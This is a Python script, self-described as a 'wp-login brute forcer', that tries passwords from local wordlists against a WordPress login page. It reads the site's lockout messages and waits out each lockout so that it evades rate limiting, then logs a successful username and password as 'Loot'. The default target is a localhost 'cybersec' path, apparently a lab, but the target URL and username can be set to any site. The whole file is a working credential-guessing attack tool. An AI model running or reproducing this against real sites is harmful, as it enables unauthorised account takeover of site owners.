#!/usr/bin/env python3
from datetime import timedelta, datetime
import random, requests
from time import sleep
import argparse
import logging

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument("-p", "--size", dest="payload_size", default=2, help="2")
parser.add_argument("-u", "--username", dest="username", default="admin", help="admin")
parser.add_argument("-ps", "--password", dest="password_path", default="passwd/", help="passwd/")
parser.add_argument("--url", dest="url", default="http://localhost/cybersec/wp-login.php", help="/wp-login.php")
parser.add_argument("--redirect", dest="redirect", default="http://localhost/cybersec/wp-admin/", help="/wp-admin")
parser.add_argument("-t", "--threads", dest="threads_flag", action=argparse.BooleanOptionalAction)
args = parser.parse_args()
logging.basicConfig(level=logging.INFO)
PAYLOAD_SIZE = int(args.payload_size)
PSSWD_PATH  = "passwd/"
wp_login = str(args.url)
wp_admin = str(args.redirect)

def fsconcat():
    from os.path import isfile, join
    from os import listdir

    ls = []
    files = [f for f in listdir(PSSWD_PATH) if isfile(join(PSSWD_PATH, f))]
    for f in files:
        f = open(PSSWD_PATH+f, "r")
        ls.extend(f.readlines())
        f.close()
    return ls

def gen_timestamp(now, delta):
    from datetime import timedelta
    delta = timedelta(seconds=(delta))
    return now+delta

def parsehtml(r):
    from bs4 import BeautifulSoup

    c = r.content
    soup = BeautifulSoup(c, 'html.parser')
    print(soup)


def checkdelay(r):
    from bs4 import BeautifulSoup

    delta = 0
    c = r.content
    soup = BeautifulSoup(c, 'html.parser')
    error_text = soup.find("div", {"id": "login_error"}).get_text().strip().split(' ')
    if "ERROR:" in error_text and "minutes." in error_text:
        mins = int(error_text[len(error_text)-2])
        delta = timedelta(minutes=mins).total_seconds()
        logging.info(f"\t[!] lockdown wait time: {mins} mins")
    elif "seconds." in error_text:
        secs = float(error_text[len(error_text)-2]) + 32
        delta = timedelta(seconds=secs).total_seconds()
        logging.info(f"\t[!] lockdown wait time: {secs} secs")
    return error_text, delta


def req(s, pwd, user=str(args.username)):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
    }
    data = {
        'log': user, 'pwd': pwd, 'redirect_to': wp_admin
    }
    r = s.post(wp_login, headers=headers, data=data, allow_redirects=False)

    err = None
    delay = 0
    if r.status_code in [302, 303]:
        logging.info(f"\t[+] hit - {user} {pwd}")
    elif r.status_code == 200:
        err, delay = checkdelay(r)
        logging.info(f"\t{err}")
    else:
        err = 504
        logging.info(f"\t[!] error \n\n {parsehtml(r)}")

    logging.info(f"\tstatus: {str(r.status_code)}; passwd: {pwd}")
    return err, delay


def seqloop(size=PAYLOAD_SIZE):
    now = datetime.now().strftime("%H:%M:%S")
    logging.info(f"\tStart time: {now}")
    delay = datetime.now()
    ls = fsconcat()
    i = 0
    while 1:
        throw = size
        if len(ls):
            if i == 0: 
                logging.info(f"\t[-] Status: {i}/{len(ls)}\n") 
            else: 
                logging.info(f"\t[-] Status: {i}/{len(ls)}")
            random.shuffle(ls)
            if delay > datetime.now():
                fdelay = delay.strftime("%H:%M:%S")
                logging.info(f"\t[!] Next payload at {fdelay}\n")
                time = delay-datetime.now()
                sleep(time.total_seconds())
            if len(ls) < throw:
                throw = len(ls)
            with requests.Session() as s:
                while throw:
                    pwd = ls.pop()
                    err, delta = req(s, pwd)
                    if err == None:
                        return pwd
                    delay = datetime.now() + timedelta(seconds=delta)
                    if delay > datetime.now():
                        ls.insert(0, pwd)
                    else:
                        i += 1
                    throw -= 1
        else:
            return None

def banner():
    print(f"""
                 /           /                                               
                /' .,,,,  ./                                                 
               /';'     ,/                                                   
              / /   ,,//,`'`                                                 
             ( ,, '_,  ,,,' ``                                               
             |    /@  ,,, ;" `                                               
            /    .   ,''/' `,``                                              
           /   .     ./, `,, ` ;                                             
        ,./  .   ,-,',` ,,/''\,'                                             
       |   /; ./,,'`,,'' |   |                                               
       |     /   ','    /    |                                               
        \___/'   '     |     |                                               
          `,,'  |      /     `\                                              
Art by         /      |        ~\                                            
 Ooyamaneko   '       (                                                      
             :                                                               
            ; .         \--                                                  
          :   \         ;
\n\t wp-login brute forcer \n
Current Config:
\t[url]           {wp_login} 
\t[redirect]      {wp_admin}
\t[user]          {args.username}
\t[pwd path]      {PSSWD_PATH} Total lines: {len(fsconcat())} \n
\tPayload size:   {PAYLOAD_SIZE}
\tThreading:      {args.threads_flag != None}

""")

def init():
    from pool import pool
    
    banner()
    if args.threads_flag:
        pool()
    else:
        pwd = seqloop()
        logging.info("\n\tLoot:\n")
        logging.info(f"t\t {args.username}/{pwd}")


if __name__ == "__main__":
    init()